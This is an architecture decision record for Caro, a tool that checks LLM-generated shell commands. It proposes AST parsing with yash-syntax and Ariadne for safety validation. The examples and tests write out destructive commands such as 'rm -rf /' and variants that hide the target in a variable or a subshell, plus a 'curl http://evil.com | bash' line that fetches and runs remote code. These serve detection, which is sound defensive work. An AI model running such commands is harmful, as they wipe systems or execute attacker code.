# ADR-007: AST Parser for Shell Command Validation and Generation

**Status**: Proposed

**Date**: 2026-01-02

**Authors**: Caro Maintainers

**Target**: Community

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Context and Problem Statement](#context-and-problem-statement)
3. [Decision Drivers](#decision-drivers)
4. [Libraries Evaluated](#libraries-evaluated)
5. [Decision](#decision)
6. [Rationale](#rationale)
7. [Consequences](#consequences)
8. [Alternatives Considered](#alternatives-considered)
9. [Implementation Notes](#implementation-notes)
10. [Success Metrics](#success-metrics)
11. [References](#references)

---

## Executive Summary

This ADR evaluates the adoption of AST (Abstract Syntax Tree) parsing for improving shell command validation and generation quality in Caro. After analyzing general-purpose parser combinators (Chumsky/Ariadne) and shell-specific parsers (yash-syntax, conch-parser, flash), we recommend a **phased hybrid approach**:

1. **Phase 1**: Adopt **yash-syntax** for AST-based safety validation
2. **Phase 2**: Use **Ariadne** for enhanced error reporting to users
3. **Phase 3 (Optional)**: Consider Chumsky only if we need custom DSL parsing beyond shell syntax

**Core Decision**: Use purpose-built shell parsers rather than building shell grammar from scratch with general-purpose combinators.

---

## Context and Problem Statement

### Current Architecture

Caro's shell command validation relies on **pattern-based regex matching**:

```
src/safety/
├── mod.rs         # SafetyValidator with quote-aware context matching
└── patterns.rs    # 48+ pre-compiled regex patterns for danger detection
```

**Current Validation Flow**:
```
LLM Output → JSON Parse → String Command → Regex Pattern Match → Risk Assessment
```

**Current Limitations**:

| Limitation | Example | Impact |
|------------|---------|--------|
| **No semantic understanding** | `rm -rf /tmp/safe` vs `rm -rf /` | Both match `rm -rf` pattern |
| **Quote handling is heuristic** | `echo "rm -rf /"` | Works, but fragile |
| **No command structure awareness** | Nested subshells, command substitution | May miss dangerous patterns |
| **No variable expansion tracking** | `DIR=/; rm -rf $DIR` | Pattern misses the danger |
| **Limited pipeline analysis** | `cat file \| rm -rf /` | Pattern-per-segment only |

### The Research Question

> Would AST-based parsing improve the quality of:
> 1. **Safety validation** - Detecting dangerous commands more accurately
> 2. **Command generation** - Helping the LLM produce better shell commands
> 3. **Error reporting** - Providing clearer feedback when commands are rejected

---

## Decision Drivers

### Primary Drivers

1. **Validation Accuracy**: Reduce false positives (blocking safe commands) and false negatives (missing dangerous commands)
2. **Semantic Understanding**: Understand command structure, not just text patterns
3. **Maintainability**: Avoid building/maintaining shell grammar from scratch
4. **Performance**: Validation must remain fast (<10ms per command)
5. **POSIX Compliance**: Must understand standard shell syntax

### Secondary Drivers

- Binary size impact (Caro targets <50MB)
- Compile time increase
- Learning curve for contributors
- Error message quality for users

---

## Libraries Evaluated

### 1. Chumsky (General-Purpose Parser Combinator)

**Repository**: [github.com/zesterer/chumsky](https://github.com/zesterer/chumsky)

| Aspect | Details |
|--------|---------|
| **Purpose** | General-purpose parser combinator library |
| **Maturity** | 4.4k stars, 84 contributors, production-ready |
| **Performance** | 533 MB/s throughput (JSON benchmark) |
| **Key Feature** | Flexible error recovery, continues parsing after errors |
| **Integration** | Pairs with Ariadne for diagnostics |

**Strengths**:
- Zero-copy parsing minimizes allocations
- Context-sensitive grammar support
- Excellent error recovery (produces partial AST on failures)
- Well-documented with examples

**Weaknesses for Caro**:
- **No shell grammar included** - Would require 1000+ lines to implement POSIX shell
- Designed for custom languages, not parsing existing standards
- Overkill for validating shell commands

**Code Example**:
```rust
// What we'd have to build from scratch:
fn shell_parser<'a>() -> impl Parser<'a, &'a str, Ast, extra::Err<Rich<'a, char>>> {
    let command = text::ident()
        .then(text::whitespace().ignore_then(argument()).repeated())
        .map(|(cmd, args)| Ast::SimpleCommand { cmd, args });

    let pipeline = command
        .separated_by(just('|').padded())
        .map(Ast::Pipeline);

    // ... 1000+ more lines for full POSIX shell support
}
```

### 2. Ariadne (Diagnostic Rendering)

**Repository**: [github.com/zesterer/ariadne](https://github.com/zesterer/ariadne)

| Aspect | Details |
|--------|---------|
| **Purpose** | Beautiful diagnostic/error message rendering |
| **Maturity** | 2.1k stars, stable API |
| **Key Feature** | Multi-line spans, colored output, label ordering |
| **Integration** | Works with any parser (not Chumsky-specific) |

**Strengths**:
- Professional-quality error output (like rustc)
- Multi-file error reporting
- Automatic label overlap prevention
- 8-bit and 24-bit color support

**Recommendation**: **Adopt for Phase 2** - Useful regardless of parser choice

**Code Example**:
```rust
use ariadne::{Report, ReportKind, Label, Source, Color};

Report::build(ReportKind::Error, "command", 0)
    .with_message("Dangerous command detected")
    .with_label(
        Label::new(("command", 0..6))
            .with_message("'rm -rf' targets root directory")
            .with_color(Color::Red)
    )
    .with_note("This command would delete all files on the system")
    .finish()
    .print(("command", Source::from("rm -rf /")))
    .unwrap();
```

**Output**:
```
Error: Dangerous command detected
   ╭─[command:1:1]
   │
 1 │ rm -rf /
   │ ^^^^^^ 'rm -rf' targets root directory
   │
   ├─ Note: This command would delete all files on the system
───╯
```

### 3. yash-syntax (Shell-Specific Parser)

**Repository**: [github.com/magicant/yash-rs](https://github.com/magicant/yash-rs/tree/main/yash-syntax)

| Aspect | Details |
|--------|---------|
| **Purpose** | POSIX shell script parsing (parse-only, no execution) |
| **Maturity** | Part of yash shell project, actively maintained (Nov 2025) |
| **POSIX Compliance** | High - targets POSIX.1-2024 compatibility |
| **Key Feature** | Complete AST with source location tracking |

**Strengths**:
- **Production-ready shell grammar** - No need to build from scratch
- Parsing-only design (no execution = smaller attack surface)
- Actively maintained with recent updates
- Supports all POSIX constructs: pipelines, redirections, expansions

**Weaknesses**:
- Less flexible than Chumsky for custom extensions
- Tied to POSIX semantics (not arbitrary DSLs)

**Recommendation**: **Adopt for Phase 1** - Best fit for shell validation

**AST Structure**:
```rust
// yash-syntax provides rich AST nodes:
pub enum Command {
    Simple(SimpleCommand),      // `ls -la`
    Compound(CompoundCommand),  // `if`, `for`, `while`, etc.
    Function(FunctionDefinition),
    Pipeline(Pipeline),         // `cmd1 | cmd2`
    AndOr(AndOrList),          // `cmd1 && cmd2`
}

pub struct SimpleCommand {
    pub assigns: Vec<Assign>,   // VAR=value
    pub words: Vec<Word>,       // Command and arguments
    pub redirs: Vec<Redir>,     // >, <, >>, etc.
}
```

### 4. conch-parser (Shell Parser - Archived)

**Repository**: [github.com/ipetkov/conch-parser](https://github.com/ipetkov/conch-parser)

| Aspect | Details |
|--------|---------|
| **Purpose** | POSIX.1-2008 shell parsing |
| **Status** | **ARCHIVED (May 2022)** - Read-only, unmaintained |
| **Key Feature** | Flexible AST Builder pattern |

**Recommendation**: **Do not adopt** - Unmaintained since 2022

### 5. flash (Shell Toolkit - Experimental)

**Repository**: [github.com/raphamorim/flash](https://github.com/raphamorim/flash)

| Aspect | Details |
|--------|---------|
| **Purpose** | Shell parser, formatter, and interpreter |
| **Status** | Experimental, active development |
| **Key Feature** | Complete toolkit with AST access |

**Recommendation**: **Monitor but do not adopt yet** - Too early for production

---

## Decision

### Recommended Approach: Phased Hybrid Strategy

```
┌─────────────────────────────────────────────────────────────────────┐
│                         PHASED ADOPTION                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Phase 1: AST-Based Validation (yash-syntax)                       │
│  ─────────────────────────────────────────────                     │
│  • Parse generated commands into AST                                │
│  • Semantic danger detection (not just regex)                       │
│  • Variable expansion tracking                                      │
│  • Pipeline and subshell awareness                                  │
│                                                                     │
│  Phase 2: Enhanced Error Reporting (Ariadne)                       │
│  ────────────────────────────────────────────                      │
│  • Beautiful CLI error messages                                     │
│  • Highlight dangerous spans in commands                            │
│  • Actionable suggestions for safe alternatives                     │
│                                                                     │
│  Phase 3: Custom Extensions (Chumsky - Optional)                   │
│  ───────────────────────────────────────────────                   │
│  • Only if we need DSL parsing beyond shell syntax                 │
│  • E.g., parsing Caro-specific annotations in commands             │
│  • Not needed for core shell validation                            │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### What We Are NOT Doing

1. **Building shell grammar with Chumsky** - Reinventing the wheel
2. **Replacing regex patterns entirely** - They remain useful for quick checks
3. **Adding execution capabilities** - We parse, not execute
4. **Using archived/unmaintained libraries** - conch-parser is out

---

## Rationale

### Why yash-syntax Over Chumsky for Shell Parsing?

| Factor | Chumsky | yash-syntax |
|--------|---------|-------------|
| **Shell grammar** | Build from scratch (weeks) | Ready to use (0 effort) |
| **POSIX compliance** | Manual verification | Tested against standard |
| **Maintenance burden** | We own the grammar | Upstream maintains |
| **Time to value** | 4-6 weeks | 1-2 weeks |
| **Risk** | Grammar bugs are our bugs | Leverages existing work |

**Key Insight**: Chumsky is excellent for building custom language parsers. But shell syntax is standardized and complex - we should leverage existing, tested implementations rather than building from scratch.

### Why Add Ariadne Regardless of Parser Choice?

Ariadne is **parser-agnostic** - it renders diagnostics, not parses. Benefits:

1. **User Experience**: Professional error messages build trust
2. **Debugging**: Users can understand why commands were rejected
3. **Low Risk**: Small, focused library with stable API
4. **Future-Proof**: Works with any parser we choose

### Why Not Just Improve Regex Patterns?

Regex patterns hit fundamental limits:

```bash
# These are semantically identical, but regex sees them differently:
rm -rf /                     # Pattern matches
rm -rf "/"                   # Pattern might miss quotes
DIR=/; rm -rf "$DIR"         # Pattern can't track variable
$(echo rm) -rf /             # Command substitution invisible
```

AST parsing understands structure:

```rust
// With AST, we can analyze semantically:
match command {
    SimpleCommand { words, .. } => {
        if words[0] == "rm" && words.contains("-rf") {
            let target = resolve_expansion(&words.last());
            if is_dangerous_path(&target) {
                return DangerLevel::Critical;
            }
        }
    }
    Pipeline { commands, .. } => {
        // Analyze each command in pipeline
    }
}
```

---

## Consequences

### Benefits

1. **Semantic Validation**: Understand command meaning, not just text
2. **Reduced False Positives**: `echo "rm -rf /"` won't trigger alerts
3. **Variable Tracking**: Detect danger through variable expansion
4. **Pipeline Analysis**: Understand command flow through pipes
5. **Better UX**: Ariadne provides clear, actionable error messages
6. **Maintainability**: Leverage upstream grammar maintenance

### Trade-offs

1. **Binary Size**: +200-400KB for parsing libraries
2. **Compile Time**: +10-15 seconds for yash-syntax
3. **Complexity**: AST handling code is more complex than regex
4. **Learning Curve**: Contributors need to understand AST structures
5. **Performance**: AST parsing slower than regex (~1ms vs ~0.1ms per command)

### Risks and Mitigations

| Risk | Probability | Impact | Mitigation |
|------|-------------|--------|------------|
| yash-syntax breaks/unmaintained | Low | High | Pin version, fork if needed |
| Performance regression | Medium | Medium | Keep regex as first-pass filter |
| AST complexity slows development | Medium | Low | Good abstractions, documentation |
| Incompatibility with non-POSIX shells | Low | Low | Maintain shell-specific validators |

---

## Alternatives Considered

### Alternative 1: Enhance Regex Patterns Only

**Description**: Improve existing pattern-based validation without AST

**Pros**:
- No new dependencies
- Minimal code changes
- Fastest execution

**Cons**:
- Fundamental limitations remain
- Can't track variables or subshells
- False positive/negative issues persist

**Why Not Chosen**: Hits ceiling on validation quality

### Alternative 2: Build Shell Grammar with Chumsky

**Description**: Implement full POSIX shell grammar using Chumsky combinators

**Pros**:
- Full control over grammar
- Chumsky's error recovery
- Unified tooling with Ariadne

**Cons**:
- 4-6 weeks development time
- Ongoing grammar maintenance burden
- Risk of subtle POSIX compliance bugs
- Reinventing tested solutions

**Why Not Chosen**: High effort for equivalent outcome to using yash-syntax

### Alternative 3: Use tree-sitter-bash

**Description**: Leverage tree-sitter's incremental parsing with Bash grammar

**Pros**:
- Battle-tested grammar
- Incremental parsing (good for editors)
- Large community

**Cons**:
- C dependency (tree-sitter core)
- More complex FFI integration
- Designed for editors, not CLI validation

**Why Not Chosen**: Heavier than needed, editor-focused design

### Alternative 4: Shell Out to External Validator

**Description**: Use `bash -n` or `shellcheck` for validation

**Pros**:
- Most accurate validation possible
- Leverages battle-tested tools

**Cons**:
- External dependency
- Process spawning overhead
- Not available on all systems
- Can't integrate deeply with Caro's safety logic

**Why Not Chosen**: Violates single-binary principle

---

## Implementation Notes

### Phase 1: AST-Based Safety Validation

**Timeline**: 2-3 weeks

**Key Components**:

```rust
// New module: src/safety/ast_validator.rs

use yash_syntax::syntax::Command;

pub struct AstSafetyValidator {
    patterns: Vec<DangerPattern>,  // Keep existing patterns as fallback
}

impl AstSafetyValidator {
    pub fn validate(&self, command_str: &str) -> ValidationResult {
        // 1. Quick regex check (fast path)
        if let Some(result) = self.quick_pattern_check(command_str) {
            return result;
        }

        // 2. Parse to AST
        let ast = match yash_syntax::parse(command_str) {
            Ok(ast) => ast,
            Err(_) => return self.fallback_validation(command_str),
        };

        // 3. Semantic analysis
        self.analyze_ast(&ast)
    }

    fn analyze_ast(&self, command: &Command) -> ValidationResult {
        match command {
            Command::Simple(simple) => self.check_simple_command(simple),
            Command::Pipeline(pipeline) => self.check_pipeline(pipeline),
            Command::Compound(compound) => self.check_compound(compound),
            // ...
        }
    }

    fn check_simple_command(&self, cmd: &SimpleCommand) -> ValidationResult {
        // Semantic analysis: resolve arguments, check paths, etc.
    }
}
```

**Cargo.toml Addition**:
```toml
[dependencies]
yash-syntax = "0.12"  # Pin specific version

[features]
ast-validation = ["yash-syntax"]  # Feature-gated initially
```

### Phase 2: Ariadne Error Reporting

**Timeline**: 1-2 weeks (can run parallel to Phase 1)

**Key Components**:

```rust
// New module: src/safety/diagnostics.rs

use ariadne::{Report, ReportKind, Label, Source, Color};

pub fn render_safety_error(
    command: &str,
    result: &ValidationResult,
) -> String {
    let mut output = Vec::new();

    Report::build(ReportKind::Error, "command", 0)
        .with_message(format!("Command blocked: {}", result.risk_level))
        .with_labels(
            result.matched_spans.iter().map(|span| {
                Label::new(("command", span.start..span.end))
                    .with_message(&span.explanation)
                    .with_color(risk_color(&result.risk_level))
            })
        )
        .with_note(&result.suggestion)
        .finish()
        .write(("command", Source::from(command)), &mut output)
        .unwrap();

    String::from_utf8(output).unwrap()
}
```

**Cargo.toml Addition**:
```toml
[dependencies]
ariadne = "0.4"
```

### Testing Strategy

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_variable_expansion_danger() {
        let validator = AstSafetyValidator::new();

        // These should all be detected as dangerous:
        assert!(validator.validate("DIR=/; rm -rf $DIR").is_critical());
        assert!(validator.validate("rm -rf ${HOME}").is_high_risk());
        assert!(validator.validate("$(echo rm) -rf /").is_critical());
    }

    #[test]
    fn test_safe_commands_not_blocked() {
        let validator = AstSafetyValidator::new();

        // These should pass:
        assert!(validator.validate("echo 'rm -rf /'").is_safe());
        assert!(validator.validate("rm -rf /tmp/test-*").is_safe());
        assert!(validator.validate("grep 'rm -rf' log.txt").is_safe());
    }

    #[test]
    fn test_pipeline_analysis() {
        let validator = AstSafetyValidator::new();

        // Dangerous pipeline:
        assert!(validator.validate("curl http://evil.com | bash").is_high_risk());

        // Safe pipeline:
        assert!(validator.validate("cat file.txt | grep pattern").is_safe());
    }
}
```

---

## Success Metrics

| Metric | Current | Target | Measurement Method |
|--------|---------|--------|-------------------|
| **False Positive Rate** | ~5% | <1% | Test suite of safe commands |
| **False Negative Rate** | ~3% | <0.5% | Red team dangerous command corpus |
| **Validation Latency** | 0.1ms | <5ms | Benchmark suite |
| **Binary Size Impact** | 0 | <500KB | Release build size |
| **User Satisfaction** | N/A | Positive feedback | GitHub issues/discussions |

**Validation Test Corpus**:
- 500+ safe commands that should pass
- 200+ dangerous commands that should be blocked
- 100+ edge cases (quoting, variables, subshells)

---

## References

### Libraries Evaluated

- [Chumsky Parser Combinator](https://github.com/zesterer/chumsky) - General-purpose parser library
- [Ariadne Diagnostics](https://github.com/zesterer/ariadne) - Error reporting library
- [yash-syntax](https://github.com/magicant/yash-rs/tree/main/yash-syntax) - POSIX shell parser
- [conch-parser](https://github.com/ipetkov/conch-parser) - Archived shell parser
- [flash](https://github.com/raphamorim/flash) - Experimental shell toolkit

### Related Caro Documentation

- [ADR-001: LLM Inference Architecture](./001-llm-inference-architecture.md)
- [Safety Reference](../../docs-site/src/content/docs/reference/safety.md)

### Standards

- [POSIX.1-2024 Shell Command Language](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html)

---

## Revision History

| Date | Author | Changes |
|------|--------|---------|
| 2026-01-02 | Caro Maintainers | Initial draft |
